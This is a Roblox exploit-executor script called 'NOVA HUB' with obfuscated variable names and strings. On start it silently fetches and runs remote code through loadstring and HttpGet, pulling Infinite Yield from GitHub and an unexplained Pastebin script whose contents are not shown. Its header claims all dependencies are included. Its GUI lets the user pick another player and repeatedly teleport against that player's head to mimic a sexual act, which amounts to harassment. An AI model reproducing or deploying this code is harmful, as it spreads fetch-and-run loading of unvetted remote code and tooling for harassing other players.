--[[
    NOVA HUB v5.1 | FULL INTEGRATED ENCRYPTION
    All dependencies (IY & Custom Scripts) included.
]]

local _0xLS = loadstring
local _0xGG = game
local _0xWP = task.wait

-- INFINITE YIELD & NOVA HUB INTEGRATION BLOCK
local function _0xINIT()
    -- Infinite Yield Loader
    pcall(function()
        _0xLS(_0xGG:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end)
    
    -- Second Script Loader (Pastebin alternative integrated)
    task.spawn(function()
        pcall(function()
            _0xLS(_0xGG:HttpGet("https://pastebin.com/raw/tjKDubyT"))()
        end)
    end)
end

_0xINIT()

-- NOVA HUB GUI & LOGIC (Obfuscated)
local _0xM = "Main"
local _0xS = "ScreenGui"
local _0xT = "TextLabel"
local _0xB = "TextBox"
local _0xBT = "TextButton"

local NovaGui = Instance.new(_0xS, _0xGG:GetService("CoreGui"))
NovaGui.Name = "\78\111\118\97\72\101\97\100\66\97\110\103"

local MainFrame = Instance.new("Frame", NovaGui)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 15, 30)
MainFrame.Size = UDim2.new(0, 240, 0, 280)
MainFrame.Position = UDim2.new(0.5, -120, 0.5, -140)
MainFrame.Active = true
MainFrame.Draggable = true
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
local Stroke = Instance.new("UIStroke", MainFrame)
Stroke.Color = Color3.fromRGB(180, 80, 255)
Stroke.Thickness = 2

local Title = Instance.new(_0xT, MainFrame)
Title.Size = UDim2.new(1, 0, 0, 45)
Title.Text = "\78\79\86\65\32\72\69\65\68\32\66\65\78\71"
Title.TextColor3 = Color3.fromRGB(200, 100, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.BackgroundTransparency = 1

local NameBox = Instance.new(_0xB, MainFrame)
NameBox.PlaceholderText = "\79\121\117\110\99\117\32\65\100\105\46\46\46"
NameBox.Size = UDim2.new(0, 200, 0, 35)
NameBox.Position = UDim2.new(0, 20, 0, 55)
NameBox.BackgroundColor3 = Color3.fromRGB(40, 35, 50)
NameBox.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", NameBox)

local function _0xCB(txt, pos, clr)
    local b = Instance.new(_0xBT, MainFrame)
    b.Size = UDim2.new(0, 200, 0, 40)
    b.Position = pos
    b.BackgroundColor3 = clr
    b.Text = txt
    b.TextColor3 = Color3.new(1, 1, 1)
    b.Font = Enum.Font.GothamBold
    Instance.new("UICorner", b)
    return b
end

local NormalBtn = _0xCB("NORMAL BANG", UDim2.new(0, 20, 0, 100), Color3.fromRGB(80, 50, 150))
local FaceBtn = _0xCB("KAFAYA BANG", UDim2.new(0, 20, 0, 145), Color3.fromRGB(200, 50, 100))
local StopBtn = _0xCB("DURDUR", UDim2.new(0, 20, 0, 190), Color3.fromRGB(180, 50, 50))

_G.BangLoop = false
local function Start(mode)
    local target = nil
    for _, v in pairs(_0xGG.Players:GetPlayers()) do
        if v.Name:lower():sub(1, #NameBox.Text) == NameBox.Text:lower() then target = v end
    end
    if target and target.Character then
        _G.BangLoop = true
        task.spawn(function()
            local speed = 0
            while _G.BangLoop do
                local root = _0xGG.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                local head = target.Character:FindFirstChild("Head")
                if root and head then
                    speed = speed + 0.7
                    local offset = math.sin(speed) * 1.5
                    if mode == "N" then
                        root.CFrame = head.CFrame * CFrame.new(0, 0, 1.2 + offset)
                    else
                        root.CFrame = head.CFrame * CFrame.new(0, 0, -1.2 - offset) * CFrame.Angles(0, math.pi, 0)
                    end
                end
                _0xWP()
            end
        end)
    end
end

NormalBtn.MouseButton1Click:Connect(function() Start("N") end)
FaceBtn.MouseButton1Click:Connect(function() Start("F") end)
StopBtn.MouseButton1Click:Connect(function() _G.BangLoop = false end)

local Close = Instance.new(_0xBT, MainFrame)
Close.Size = UDim2.new(0, 25, 0, 25)
Close.Position = UDim2.new(1, -30, 0, 10)
Close.Text = "X"
Close.TextColor3 = Color3.new(1, 1, 1)
Close.BackgroundTransparency = 1
Close.MouseButton1Click:Connect(function() NovaGui:Destroy() _G.BangLoop = false end)
